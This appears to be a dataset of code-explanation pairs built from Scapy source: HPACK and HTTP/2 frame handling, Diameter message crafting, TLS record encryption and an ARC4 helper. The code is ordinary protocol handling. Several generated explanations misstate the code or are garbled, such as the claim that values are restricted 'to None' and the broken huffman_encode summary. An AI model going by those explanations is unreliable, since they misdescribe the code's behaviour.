{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\noverloading to restrict the acceptable x values to None.", "response": "def h2i(self, pkt, x):\n        # type: (Optional[packet.Packet], int) -> int\n        \"\"\" h2i is overloaded to restrict the acceptable x values (not None)\n\n        @param packet.Packet|None pkt: the packet instance containing this field instance; probably unused.  # noqa: E501\n        @param int x: the value to convert.\n        @return int: the converted value.\n        @raise AssertionError\n        \"\"\"\n        ret = super(UVarIntField, self).h2i(pkt, x)\n        assert(not isinstance(ret, type(None)) and ret >= 0)\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef i2repr(self, pkt, x):\n        # type: (Optional[packet.Packet], int) -> str\n        \"\"\" i2repr is overloaded to restrict the acceptable x values (not None)\n\n        @param packet.Packet|None pkt: the packet instance containing this field instance; probably unused.  # noqa: E501\n        @param int x: the value to convert.\n        @return str: the converted value.\n        \"\"\"\n        return super(UVarIntField, self).i2repr(pkt, x)", "response": "Overloaded to restrict the acceptable x values to None."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _compute_value(self, pkt):\n        # type: (packet.Packet) -> int\n        \"\"\" Computes the value of this field based on the provided packet and\n        the length_of field and the adjust callback\n\n        @param packet.Packet pkt: the packet from which is computed this field value.  # noqa: E501\n        @return int: the computed value for this field.\n        @raise KeyError: the packet nor its payload do not contain an attribute\n          with the length_of name.\n        @raise AssertionError\n        @raise KeyError if _length_of is not one of pkt fields\n        \"\"\"\n        fld, fval = pkt.getfield_and_val(self._length_of)\n        val = fld.i2len(pkt, fval)\n        ret = self._adjust(val)\n        assert(ret >= 0)\n        return ret", "response": "Compute the value of this field based on the provided packet and the length_of attribute and the adjust callback\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef huffman_encode(cls, s):\n        # type: (str) -> Tuple[int, int]\n        \"\"\" huffman_encode returns the bitstring and the bitlength of the\n        bitstring representing the string provided as a parameter\n\n        @param str s: the string to encode\n        @return (int, int): the bitstring of s and its bitlength\n        @raise AssertionError\n        \"\"\"\n        i = 0\n        ibl = 0\n        for c in s:\n            val, bl = cls._huffman_encode_char(c)\n            i = (i << bl) + val\n            ibl += bl\n\n        padlen = 8 - (ibl % 8)\n        if padlen != 8:\n            val, bl = cls._huffman_encode_char(EOS())\n            i = (i << padlen) + (val >> (bl - padlen))\n            ibl += padlen\n\n        ret = i, ibl\n        assert(ret[0] >= 0)\n        assert (ret[1] >= 0)\n        return ret", "response": "huffman_encode returns the bitstring and the bitlength of the the\n            class s parameter as a parameter\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef huffman_compute_decode_tree(cls):\n        # type: () -> None\n        \"\"\" huffman_compute_decode_tree initializes/builds the static_huffman_tree\n\n        @return None\n        @raise InvalidEncodingException if there is an encoding problem\n        \"\"\"\n        cls.static_huffman_tree = HuffmanNode(None, None)\n        i = 0\n        for entry in cls.static_huffman_code:\n            parent = cls.static_huffman_tree\n            for idx in range(entry[1] - 1, -1, -1):\n                b = (entry[0] >> idx) & 1\n                if isinstance(parent[b], bytes):\n                    raise InvalidEncodingException('Huffman unique prefix violation :/')  # noqa: E501\n                if idx == 0:\n                    parent[b] = chb(i) if i < 256 else EOS()\n                elif parent[b] is None:\n                    parent[b] = HuffmanNode(None, None)\n                parent = parent[b]\n            i += 1", "response": "Compute the decode tree for the static_huffman_tree."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef dispatch_hook(cls, s=None, *_args, **_kwds):\n        # type: (Optional[str], *Any, **Any) -> base_classes.Packet_metaclass\n        \"\"\"dispatch_hook returns the subclass of HPackHeaders that must be used\n        to dissect the string.\n        \"\"\"\n        if s is None:\n            return config.conf.raw_layer\n        fb = orb(s[0])\n        if fb & 0x80 != 0:\n            return HPackIndexedHdr\n        if fb & 0x40 != 0:\n            return HPackLitHdrFldWithIncrIndexing\n        if fb & 0x20 != 0:\n            return HPackDynamicSizeUpdate\n        return HPackLitHdrFldWithoutIndexing", "response": "This is a private method that returns the subclass of base_classes. Packet_metaclass_base. HPackHeaderBase that must be used\n        to dissect the string."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_hdrs_len(self):\n        # type: () -> int\n        \"\"\" get_hdrs_len computes the length of the hdrs field\n\n        To do this computation, the length of the padlen field, the priority\n        information fields and the actual padding is subtracted to the string\n        that was provided to the pre_dissect fun of the pkt parameter.\n        @return int: the length of the hdrs field\n        @raise AssertionError\n        \"\"\"\n\n        padding_len = self.getfieldval('padlen')\n        fld, fval = self.getfield_and_val('padlen')\n        padding_len_len = fld.i2len(self, fval)\n        bit_cnt = self.get_field('exclusive').size\n        bit_cnt += self.get_field('stream_dependency').size\n        fld, fval = self.getfield_and_val('weight')\n        weight_len = fld.i2len(self, fval)\n        ret = int(self.s_len -\n                  padding_len_len -\n                  padding_len -\n                  (bit_cnt / 8) -\n                  weight_len\n                  )\n        assert(ret >= 0)\n        return ret", "response": "This method computes the length of the hdrs field\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_hdrs_len(self):\n        # type: () -> int\n        \"\"\" get_hdrs_len computes the length of the hdrs field\n\n        To do this computation, the length of the padlen field, reserved,\n        stream_id and the actual padding is subtracted to the string that was\n        provided to the pre_dissect fun of the pkt parameter.\n        @return int: the length of the hdrs field\n        @raise AssertionError\n        \"\"\"\n        fld, padding_len = self.getfield_and_val('padlen')\n        padding_len_len = fld.i2len(self, padding_len)\n        bit_len = self.get_field('reserved').size\n        bit_len += self.get_field('stream_id').size\n\n        ret = int(self.s_len -\n                  padding_len_len -\n                  padding_len -\n                  (bit_len / 8)\n                  )\n        assert(ret >= 0)\n        return ret", "response": "This method computes the length of the hdrs field\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef guess_payload_class(self, payload):\n        # type: (str) -> base_classes.Packet_metaclass\n        \"\"\" guess_payload_class returns the Class object to use for parsing a payload\n        This function uses the H2Frame.type field value to decide which payload to parse. The implement cannot be  # noqa: E501\n        performed using the simple bind_layers helper because sometimes the selection of which Class object to return  # noqa: E501\n        also depends on the H2Frame.flags value.\n\n        @param payload:\n        @return:\n        \"\"\"\n        if len(payload) == 0:\n            return packet.NoPayload\n\n        t = self.getfieldval('type')\n        if t == H2DataFrame.type_id:\n            if H2DataFrame.flags[H2DataFrame.PADDED_FLAG].short in self.getfieldval('flags'):  # noqa: E501\n                return H2PaddedDataFrame\n            return H2DataFrame\n\n        if t == H2HeadersFrame.type_id:\n            if H2HeadersFrame.flags[H2HeadersFrame.PADDED_FLAG].short in self.getfieldval('flags'):  # noqa: E501\n                if H2HeadersFrame.flags[H2HeadersFrame.PRIORITY_FLAG].short in self.getfieldval('flags'):  # noqa: E501\n                    return H2PaddedPriorityHeadersFrame\n                else:\n                    return H2PaddedHeadersFrame\n            elif H2HeadersFrame.flags[H2HeadersFrame.PRIORITY_FLAG].short in self.getfieldval('flags'):  # noqa: E501\n                return H2PriorityHeadersFrame\n            return H2HeadersFrame\n\n        if t == H2PriorityFrame.type_id:\n            return H2PriorityFrame\n\n        if t == H2ResetFrame.type_id:\n            return H2ResetFrame\n\n        if t == H2SettingsFrame.type_id:\n            return H2SettingsFrame\n\n        if t == H2PushPromiseFrame.type_id:\n            if H2PushPromiseFrame.flags[H2PushPromiseFrame.PADDED_FLAG].short in self.getfieldval('flags'):  # noqa: E501\n                return H2PaddedPushPromiseFrame\n            return H2PushPromiseFrame\n\n        if t == H2PingFrame.type_id:\n            return H2PingFrame\n\n        if t == H2GoAwayFrame.type_id:\n            return H2GoAwayFrame\n\n        if t == H2WindowUpdateFrame.type_id:\n            return H2WindowUpdateFrame\n\n        if t == H2ContinuationFrame.type_id:\n            return H2ContinuationFrame\n\n        return config.conf.padding_layer", "response": "This function returns the Class object to use for parsing a payload."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef recap(self, nc):\n        # type: (int) -> None\n        \"\"\"recap changes the maximum size limit of the dynamic table. It also\n        proceeds to a resize(), if the new size is lower than the previous one.\n        @param int nc: the new cap of the dynamic table (that is the maximum-maximum size)  # noqa: E501\n        @raise AssertionError\n        \"\"\"\n        assert(nc >= 0)\n        t = self._dynamic_table_cap_size > nc\n        self._dynamic_table_cap_size = nc\n\n        if t:\n            # The RFC is not clear about whether this resize should happen;\n            # we do it anyway\n            self.resize(nc)", "response": "This method changes the maximum size limit of the dynamic table. It also updates the dynamic table cap size to match the new size of the dynamic table."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _reduce_dynamic_table(self, new_entry_size=0):\n        # type: (int) -> None\n        \"\"\"_reduce_dynamic_table evicts entries from the dynamic table until it\n        fits in less than the current size limit. The optional parameter,\n        new_entry_size, allows the resize to happen so that a new entry of this\n        size fits in.\n        @param int new_entry_size: if called before adding a new entry, the size of the new entry in bytes (following  # noqa: E501\n        the RFC7541 definition of the size of an entry)\n        @raise AssertionError\n        \"\"\"\n        assert(new_entry_size >= 0)\n        cur_sz = len(self)\n        dyn_tbl_sz = len(self._dynamic_table)\n        while dyn_tbl_sz > 0 and cur_sz + new_entry_size > self._dynamic_table_max_size:  # noqa: E501\n            last_elmt_sz = len(self._dynamic_table[-1])\n            self._dynamic_table.pop()\n            dyn_tbl_sz -= 1\n            cur_sz -= last_elmt_sz", "response": "_reduce_dynamic_table evicts entries from the dynamic table until the current size limit is reached."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_idx_by_name(self, name):\n        # type: (str) -> Optional[int]\n        \"\"\" get_idx_by_name returns the index of a matching registered header\n\n        This implementation will prefer returning a static entry index whenever\n        possible. If multiple matching header name are found in the static\n        table, there is insurance that the first entry (lowest index number)\n        will be returned.\n        If no matching header is found, this method returns None.\n        \"\"\"\n        name = name.lower()\n        for key, val in six.iteritems(type(self)._static_entries):\n            if val.name() == name:\n                return key\n        for idx, val in enumerate(self._dynamic_table):\n            if val.name() == name:\n                return type(self)._static_entries_last_idx + idx + 1\n        return None", "response": "This method returns the index of a matching registered header in the static entry table that matches the given name."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef gen_txt_repr(self, hdrs, register=True):\n        # type: (Union[H2Frame, List[HPackHeaders]], Optional[bool]) -> str\n        \"\"\" gen_txt_repr returns a \"textual\" representation of the provided\n        headers.\n\n        The output of this function is compatible with the input of\n        parse_txt_hdrs.\n        @param H2Frame|list of HPackHeaders hdrs: the list of headers to convert to textual representation  # noqa: E501\n        @param bool: whether incremental headers should be added to the dynamic table as we generate the text  # noqa: E501\n            representation\n        @return str: the textual representation of the provided headers\n        @raise AssertionError\n        \"\"\"\n        lst = []\n        if isinstance(hdrs, H2Frame):\n            hdrs = hdrs.payload.hdrs\n\n        for hdr in hdrs:\n            try:\n                if isinstance(hdr, HPackIndexedHdr):\n                    lst.append('{}'.format(self[hdr.index]))\n                elif isinstance(hdr, (\n                    HPackLitHdrFldWithIncrIndexing,\n                    HPackLitHdrFldWithoutIndexing\n                )):\n                    if hdr.index != 0:\n                        name = self[hdr.index].name()\n                    else:\n                        name = hdr.hdr_name.getfieldval('data').origin()\n                    if name.startswith(':'):\n                        lst.append(\n                            '{} {}'.format(\n                                name,\n                                hdr.hdr_value.getfieldval('data').origin()\n                            )\n                        )\n                    else:\n                        lst.append(\n                            '{}: {}'.format(\n                                name,\n                                hdr.hdr_value.getfieldval('data').origin()\n                            )\n                        )\n                if register and isinstance(hdr, HPackLitHdrFldWithIncrIndexing):  # noqa: E501\n                    self.register(hdr)\n            except KeyError as e:  # raised when an index is out-of-bound\n                print(e)\n                continue\n        return '\\n'.join(lst)", "response": "This function returns a textual representation of the provided headers."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _convert_a_header_to_a_h2_header(self, hdr_name, hdr_value, is_sensitive, should_index):  # noqa: E501\n        # type: (str, str, Callable[[str, str], bool], Callable[[str], bool]) -> Tuple[HPackHeaders, int]  # noqa: E501\n        \"\"\" _convert_a_header_to_a_h2_header builds a HPackHeaders from a header\n        name and a value. It returns a HPackIndexedHdr whenever possible. If not,  # noqa: E501\n        it returns a HPackLitHdrFldWithoutIndexing or a\n        HPackLitHdrFldWithIncrIndexing, based on the should_index callback.\n        HPackLitHdrFldWithoutIndexing is forced if the is_sensitive callback\n        returns True and its never_index bit is set.\n        \"\"\"\n\n        # If both name and value are already indexed\n        idx = self.get_idx_by_name_and_value(hdr_name, hdr_value)\n        if idx is not None:\n            return HPackIndexedHdr(index=idx), len(self[idx])\n\n        # The value is not indexed for this headers\n\n        hdr_value = self._optimize_header_length_and_packetify(hdr_value)\n\n        # Searching if the header name is indexed\n        idx = self.get_idx_by_name(hdr_name)\n        if idx is not None:\n            if is_sensitive(\n                hdr_name,\n                hdr_value.getfieldval('data').origin()\n            ):\n                return HPackLitHdrFldWithoutIndexing(\n                    never_index=1,\n                    index=idx,\n                    hdr_value=hdr_value\n                ), len(\n                    HPackHdrEntry(\n                        self[idx].name(),\n                        hdr_value.getfieldval('data').origin()\n                    )\n                )\n            if should_index(hdr_name):\n                return HPackLitHdrFldWithIncrIndexing(\n                    index=idx,\n                    hdr_value=hdr_value\n                ), len(\n                    HPackHdrEntry(\n                        self[idx].name(),\n                        hdr_value.getfieldval('data').origin()\n                    )\n                )\n            return HPackLitHdrFldWithoutIndexing(\n                index=idx,\n                hdr_value=hdr_value\n            ), len(\n                HPackHdrEntry(\n                    self[idx].name(),\n                    hdr_value.getfieldval('data').origin()\n                )\n            )\n\n        hdr_name = self._optimize_header_length_and_packetify(hdr_name)\n\n        if is_sensitive(\n            hdr_name.getfieldval('data').origin(),\n            hdr_value.getfieldval('data').origin()\n        ):\n            return HPackLitHdrFldWithoutIndexing(\n                never_index=1,\n                index=0,\n                hdr_name=hdr_name,\n                hdr_value=hdr_value\n            ), len(\n                HPackHdrEntry(\n                    hdr_name.getfieldval('data').origin(),\n                    hdr_value.getfieldval('data').origin()\n                )\n            )\n        if should_index(hdr_name.getfieldval('data').origin()):\n            return HPackLitHdrFldWithIncrIndexing(\n                index=0,\n                hdr_name=hdr_name,\n                hdr_value=hdr_value\n            ), len(\n                HPackHdrEntry(\n                    hdr_name.getfieldval('data').origin(),\n                    hdr_value.getfieldval('data').origin()\n                )\n            )\n        return HPackLitHdrFldWithoutIndexing(\n            index=0,\n            hdr_name=hdr_name,\n            hdr_value=hdr_value\n        ), len(\n            HPackHdrEntry(\n                hdr_name.getfieldval('data').origin(),\n                hdr_value.getfieldval('data').origin()\n            )\n        )", "response": "This function converts a header name and value to a HPackHeader. It returns a HPackIndexedHdr if possible and a HPackLitHdrFldWithIncrIndexing if possible."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nparse the given string s into a series of H2Frames with the correct flags.", "response": "def parse_txt_hdrs(self,\n                       s,  # type: str\n                       stream_id=1,  # type: int\n                       body=None,  # type: Optional[str]\n                       max_frm_sz=4096,  # type: int\n                       max_hdr_lst_sz=0,  # type: int\n                       is_sensitive=lambda n, v: False,  # type: Callable[[str, str], bool]  # noqa: E501\n                       should_index=lambda x: False,  # type: Callable[[str], bool]  # noqa: E501\n                       register=True,  # type: bool\n                       ):\n        # type: (...) -> H2Seq\n        \"\"\" parse_txt_hdrs parses headers expressed in text and converts them\n        into a series of H2Frames with the \"correct\" flags. A body can be provided  # noqa: E501\n        in which case, the data frames are added, bearing the End Stream flag,\n        instead of the H2HeadersFrame/H2ContinuationFrame. The generated frames\n        may respect max_frm_sz (SETTINGS_MAX_FRAME_SIZE) and\n        max_hdr_lst_sz (SETTINGS_MAX_HEADER_LIST_SIZE) if provided. The headers\n        are split into multiple headers fragment (and H2Frames) to respect these  # noqa: E501\n        limits. Also, a callback can be provided to tell if a header should be\n        never indexed (sensitive headers, such as cookies), and another callback  # noqa: E501\n        say if the header should be registered into the index table at all.\n        For an header to be registered, the is_sensitive callback must return\n        False AND the should_index callback should return True. This is the\n        default behavior.\n\n        @param str s: the string to parse for headers\n        @param int stream_id: the stream id to use in the generated H2Frames\n        @param str|None body: the eventual body of the request, that is added to the generated frames  # noqa: E501\n        @param int max_frm_sz: the maximum frame size. This is used to split the headers and data frames according to  # noqa: E501\n        the maximum frame size negotiated for this connection\n        @param int max_hdr_lst_sz: the maximum size of a \"header fragment\" as defined in RFC7540  # noqa: E501\n        @param callable is_sensitive: callback that returns True if the provided header is sensible and must be stored  # noqa: E501\n        in a header packet requesting this header never to be indexed\n        @param callable should_index: callback that returns True if the provided header should be stored in a header  # noqa: E501\n        packet requesting indexation in the dynamic header table.\n        @param bool register: whether to register new headers with incremental indexing as we parse them  # noqa: E501\n        @raise Exception\n        \"\"\"\n\n        sio = BytesIO(s)\n\n        base_frm_len = len(raw(H2Frame()))\n\n        ret = H2Seq()\n        cur_frm = H2HeadersFrame()  # type: Union[H2HeadersFrame, H2ContinuationFrame]  # noqa: E501\n        cur_hdr_sz = 0\n\n        # For each line in the headers str to parse\n        for hdr_line in sio:\n            hdr_name, hdr_value = self._parse_header_line(hdr_line)\n            if hdr_name is None:\n                continue\n\n            new_hdr, new_hdr_len = self._convert_a_header_to_a_h2_header(\n                hdr_name, hdr_value, is_sensitive, should_index\n            )\n            new_hdr_bin_len = len(raw(new_hdr))\n\n            if register and isinstance(new_hdr, HPackLitHdrFldWithIncrIndexing):  # noqa: E501\n                self.register(new_hdr)\n\n            # The new header binary length (+ base frame size) must not exceed\n            # the maximum frame size or it will just never fit. Also, the\n            # header entry length (as specified in RFC7540 par6.5.2) must not\n            # exceed the maximum length of a header fragment or it will just\n            # never fit\n            if (new_hdr_bin_len + base_frm_len > max_frm_sz or\n                    (max_hdr_lst_sz != 0 and new_hdr_len > max_hdr_lst_sz)):\n                raise Exception('Header too long: {}'.format(hdr_name))\n\n            if (max_frm_sz < len(raw(cur_frm)) + base_frm_len + new_hdr_len or\n                (\n                    max_hdr_lst_sz != 0 and\n                    max_hdr_lst_sz < cur_hdr_sz + new_hdr_len\n            )\n            ):\n                flags = set()\n                if isinstance(cur_frm, H2HeadersFrame) and not body:\n                    flags.add('ES')\n                ret.frames.append(H2Frame(stream_id=stream_id, flags=flags) / cur_frm)  # noqa: E501\n                cur_frm = H2ContinuationFrame()\n                cur_hdr_sz = 0\n\n            hdr_list = cur_frm.hdrs\n            hdr_list += new_hdr\n            cur_hdr_sz += new_hdr_len\n\n        flags = {'EH'}\n        if isinstance(cur_frm, H2HeadersFrame) and not body:\n            flags.add('ES')\n        ret.frames.append(H2Frame(stream_id=stream_id, flags=flags) / cur_frm)\n\n        if body:\n            base_data_frm_len = len(raw(H2DataFrame()))\n            sio = BytesIO(body)\n            frgmt = sio.read(max_frm_sz - base_data_frm_len - base_frm_len)\n            while frgmt:\n                nxt_frgmt = sio.read(max_frm_sz - base_data_frm_len - base_frm_len)  # noqa: E501\n                flags = set()\n                if len(nxt_frgmt) == 0:\n                    flags.add('ES')\n                ret.frames.append(\n                    H2Frame(stream_id=stream_id, flags=flags) / H2DataFrame(data=frgmt)  # noqa: E501\n                )\n                frgmt = nxt_frgmt\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef AVP(avpId, **fields):\n    val = None\n    classType = AVP_Unknown\n    if isinstance(avpId, str):\n        try:\n            for vnd in AvpDefDict:\n                for code in AvpDefDict[vnd]:\n                    val = AvpDefDict[vnd][code]\n                    if val[0][:len(\n                            avpId)] == avpId:  # A prefix of the full name is considered valid  # noqa: E501\n                        raise\n            found = False\n        except BaseException:\n            found = True\n    else:\n        if isinstance(avpId, list):\n            code = avpId[0]\n            vnd = avpId[1]\n        else:  # Assume this is an int\n            code = avpId\n            vnd = 0\n        try:\n            val = AvpDefDict[vnd][code]\n            found = True\n        except BaseException:\n            found = False\n    if not found:\n        warning('The AVP identifier %s has not been found.' % str(avpId))\n        if isinstance(avpId, str):  # The string input is not valid\n            return None\n    # At this point code, vnd are provisionned val may be set (if found is True)  # noqa: E501\n    # Set/override AVP code\n    fields['avpCode'] = code\n    # Set vendor if not already defined and relevant\n    if 'avpVnd' not in fields and vnd:\n        fields['avpVnd'] = vnd\n    # Set flags if not already defined and possible ...\n    if 'avpFlags' not in fields:\n        if val:\n            fields['avpFlags'] = val[2]\n        else:\n            fields['avpFlags'] = vnd and 128 or 0\n    # Finally, set the name and class if possible\n    if val:\n        classType = val[1]\n    _ret = classType(**fields)\n    if val:\n        _ret.name = 'AVP ' + val[0]\n    return _ret", "response": "Craft an AVP based on its id and optional parameter fields"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef getCmdParams(cmd, request, **fields):\n    drCode = None\n    params = None\n    drAppId = None\n    # Fetch the parameters if cmd is found in dict\n    if isinstance(cmd, int):\n        drCode = cmd    # Enable to craft commands with non standard code\n        if cmd in DR_cmd_def:\n            params = DR_cmd_def[drCode]\n        else:\n            params = ('Unknown', 'UK', {0: (128, 0)})\n            warning(\n                'No Diameter command with code %d found in DR_cmd_def dictionary' %  # noqa: E501\n                cmd)\n    else:  # Assume command is a string\n        if len(cmd) > 3:     # Assume full command name given\n            fpos = 0\n        else:         # Assume abbreviated name is given and take only the first two letters  # noqa: E501\n            cmd = cmd[:2]\n            fpos = 1\n        for k, f in DR_cmd_def.items():\n            if f[fpos][:len(\n                    cmd)] == cmd:   # Accept only a prefix of the full name\n                drCode = k\n                params = f\n                break\n        if not drCode:\n            warning(\n                'Diameter command with name %s not found in DR_cmd_def dictionary.' %  # noqa: E501\n                cmd)\n            return (fields, 'Unknown')\n    # The drCode is set/overridden in any case\n    fields['drCode'] = drCode\n    # Processing of drAppId\n    if 'drAppId' in fields:\n        val = fields['drAppId']\n        if isinstance(val, str):   # Translate into application Id code\n            found = False\n            for k, v in six.iteritems(AppIDsEnum):\n                if v.find(val) != -1:\n                    drAppId = k\n                    fields['drAppId'] = drAppId\n                    found = True\n                    break\n            if not found:\n                del(fields['drAppId'])\n                warning(\n                    'Application ID with name %s not found in AppIDsEnum dictionary.' %  # noqa: E501\n                    val)\n                return (fields, 'Unknown')\n        else:   # Assume type is int\n            drAppId = val\n    else:  # Application Id shall be taken from the params found based on cmd\n        drAppId = next(iter(params[2]))   # The first record is taken\n        fields['drAppId'] = drAppId\n    # Set the command name\n    name = request and params[0] + '-Request' or params[0] + '-Answer'\n    # Processing of flags (only if not provided manually)\n    if 'drFlags' not in fields:\n        if drAppId in params[2]:\n            flags = params[2][drAppId]\n            fields['drFlags'] = request and flags[0] or flags[1]\n    return (fields, name)", "response": "Update or fill the fields with the parameters depending on the command code."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncrafting Diameter request commands", "response": "def DiamReq(cmd, **fields):\n    \"\"\"Craft Diameter request commands\"\"\"\n    upfields, name = getCmdParams(cmd, True, **fields)\n    p = DiamG(**upfields)\n    p.name = name\n    return p"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef DiamAns(cmd, **fields):\n    upfields, name = getCmdParams(cmd, False, **fields)\n    p = DiamG(**upfields)\n    p.name = name\n    return p", "response": "Craft Diameter answer commands"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef i2m(self, pkt, x):\n        if x is None:\n            x = 0\n        elif isinstance(x, str):\n            return bytes_encode(x)\n        return x", "response": "Convert internal value to machine value"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _find_fld_pkt_val(self, pkt, val):\n        fld = self._iterate_fields_cond(pkt, val, True)\n        # Default ? (in this case, let's make sure it's up-do-date)\n        dflts_pkt = pkt.default_fields\n        if val == dflts_pkt[self.name] and self.name not in pkt.fields:\n            dflts_pkt[self.name] = fld.default\n            val = fld.default\n        return fld, val", "response": "Given a Packet instance pkt and the value val to be set returns the Field subclass to be used and the updated val."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the Field subclass to be used depending on the Packet instance.", "response": "def _find_fld(self):\n        \"\"\"Returns the Field subclass to be used, depending on the Packet\ninstance, or the default subclass.\n\nDEV: since the Packet instance is not provided, we have to use a hack\nto guess it. It should only be used if you cannot provide the current\nPacket instance (for example, because of the current Scapy API).\n\nIf you have the current Packet instance, use ._find_fld_pkt_val() (if\nthe value to set is also known) of ._find_fld_pkt() instead.\n\n        \"\"\"\n        # Hack to preserve current Scapy API\n        # See https://stackoverflow.com/a/7272464/3223422\n        frame = inspect.currentframe().f_back.f_back\n        while frame is not None:\n            try:\n                pkt = frame.f_locals['self']\n            except KeyError:\n                pass\n            else:\n                if isinstance(pkt, tuple(self.dflt.owners)):\n                    return self._find_fld_pkt(pkt)\n            frame = frame.f_back\n        return self.dflt"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _fixup_val(self, x):\n        if isinstance(x, (list, tuple)):\n            return type(x)(\n                v if v is None or isinstance(v, FlagValue)\n                else FlagValue(v, self.names)\n                for v in x\n            )\n        return x if x is None or isinstance(x, FlagValue) else FlagValue(x, self.names)", "response": "Returns a FlagValue instance when needed. Internal method to be\nused in i2i and i2o methods."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _check_uuid_fmt(self):\n        if self.uuid_fmt not in UUIDField.FORMATS:\n            raise FieldValueRangeException(\n                \"Unsupported uuid_fmt ({})\".format(self.uuid_fmt))", "response": "Checks. uuid_fmt and raises an exception if it is not valid."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef pre_dissect(self, s):\n        if len(s) < 1:\n            raise Exception(\"Invalid InnerPlaintext (too short).\")\n\n        tmp_len = len(s) - 1\n        if s[-1] != b\"\\x00\":\n            msg_len = tmp_len\n        else:\n            n = 1\n            while s[-n] != b\"\\x00\" and n < tmp_len:\n                n += 1\n            msg_len = tmp_len - n\n        self.fields_desc[0].length_from = lambda pkt: msg_len\n\n        self.type = struct.unpack(\"B\", s[msg_len:msg_len + 1])[0]\n\n        return s", "response": "Parse the message list and set the type field."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _tls_auth_decrypt(self, s):\n        rcs = self.tls_session.rcs\n        read_seq_num = struct.pack(\"!Q\", rcs.seq_num)\n        rcs.seq_num += 1\n        try:\n            return rcs.cipher.auth_decrypt(b\"\", s, read_seq_num)\n        except CipherError as e:\n            return e.args\n        except AEADTagError as e:\n            pkt_info = self.firstlayer().summary()\n            log_runtime.info(\"TLS: record integrity check failed [%s]\", pkt_info)  # noqa: E501\n            return e.args", "response": "Decrypt the input string s with AEAD - ciphered data and return the decrypted AEAD - encrypted data."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef pre_dissect(self, s):\n        if len(s) < 5:\n            raise Exception(\"Invalid record: header is too short.\")\n\n        if isinstance(self.tls_session.rcs.cipher, Cipher_NULL):\n            self.deciphered_len = None\n            return s\n        else:\n            msglen = struct.unpack('!H', s[3:5])[0]\n            hdr, efrag, r = s[:5], s[5:5 + msglen], s[msglen + 5:]\n            frag, auth_tag = self._tls_auth_decrypt(efrag)\n            self.deciphered_len = len(frag)\n            return hdr + frag + auth_tag + r", "response": "Decrypt verify and decompress the message."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef post_dissect(self, s):\n        if self.tls_session.triggered_prcs_commit:\n            if self.tls_session.prcs is not None:\n                self.tls_session.rcs = self.tls_session.prcs\n                self.tls_session.prcs = None\n            self.tls_session.triggered_prcs_commit = False\n        return s", "response": "Update the pending read state if the prcs has been set."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _tls_auth_encrypt(self, s):\n        wcs = self.tls_session.wcs\n        write_seq_num = struct.pack(\"!Q\", wcs.seq_num)\n        wcs.seq_num += 1\n        return wcs.cipher.auth_encrypt(s, b\"\", write_seq_num)", "response": "Encrypt a string with the AEAD ciphertext."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\napply the previous methods according to the writing cipher type.", "response": "def post_build(self, pkt, pay):\n        \"\"\"\n        Apply the previous methods according to the writing cipher type.\n        \"\"\"\n        # Compute the length of TLSPlaintext fragment\n        hdr, frag = pkt[:5], pkt[5:]\n        if not isinstance(self.tls_session.rcs.cipher, Cipher_NULL):\n            frag = self._tls_auth_encrypt(frag)\n\n        if self.len is not None:\n            # The user gave us a 'len', let's respect this ultimately\n            hdr = hdr[:3] + struct.pack(\"!H\", self.len)\n        else:\n            # Update header with the length of TLSCiphertext.inner\n            hdr = hdr[:3] + struct.pack(\"!H\", len(frag))\n\n        # Now we commit the pending write state if it has been triggered. We\n        # update nothing if the pwcs was not set. This probably means that\n        # we're working out-of-context (and we need to keep the default wcs).\n        if self.tls_session.triggered_pwcs_commit:\n            if self.tls_session.pwcs is not None:\n                self.tls_session.wcs = self.tls_session.pwcs\n                self.tls_session.pwcs = None\n            self.tls_session.triggered_pwcs_commit = False\n\n        return hdr + frag + pay"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nencrypt data with key key.", "response": "def ARC4_encrypt(key, data, skip=0):\n    \"\"\"Encrypt data @data with key @key, skipping @skip first bytes of the\n    keystream\"\"\"\n\n    algorithm = algorithms.ARC4(key)\n    cipher = Cipher(algorithm, mode=None, backend=default_backend())\n    encryptor = cipher.encryptor()\n    if skip:\n        encryptor.update(b\"\\x00\" * skip)\n    return encryptor.update(data)"}
